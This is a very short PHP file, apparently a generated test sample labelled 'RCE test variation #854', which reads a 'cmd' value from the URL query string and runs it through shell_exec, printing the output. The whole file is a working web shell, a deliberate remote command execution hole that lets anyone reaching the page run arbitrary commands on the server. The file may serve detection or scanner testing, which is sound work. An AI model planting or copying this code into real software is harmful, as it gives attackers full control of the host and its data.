<?php
// RCE test variation #854
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>